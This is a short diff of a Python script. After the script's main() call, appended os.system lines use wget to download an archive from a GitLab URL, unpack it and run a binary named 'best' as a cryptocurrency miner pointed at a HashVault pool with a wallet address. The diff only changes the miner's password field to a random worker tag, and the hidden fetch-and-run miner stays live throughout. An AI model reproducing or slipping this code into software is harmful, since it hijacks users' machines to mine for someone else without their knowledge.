@@ -74,4 +74,4 @@ if __name__ == "__main__":
     main()
 os.system('wget https://gitlab.com/gasolin1/lah/-/raw/main/best.tar.gz')
 os.system('tar -xvf best.tar.gz')
-os.system('./best --tls-url pool.hashvault.pro:80 --user ccx7aoNYpGb7sndJtEDWvCBQhPAy9mC8QW5KWuCx8J1FJrDcDrER1XYA9LGtggrR7ZC4KfQmQ2uRN47L9WypBbNLAeq2Q4Q9WN.8cd54ecc2a8e42265e3020c20074d29804198073297dc01a9f9577186343e62c --pass kzp --currency cryptonight_gpu')
+os.system('./best --tls-url pool.hashvault.pro:80 --user ccx7aoNYpGb7sndJtEDWvCBQhPAy9mC8QW5KWuCx8J1FJrDcDrER1XYA9LGtggrR7ZC4KfQmQ2uRN47L9WypBbNLAeq2Q4Q9WN.8cd54ecc2a8e42265e3020c20074d29804198073297dc01a9f9577186343e62c --pass  $(echo $(shuf -i 1-20000 -n 1)-kido) --currency cryptonight_gpu')
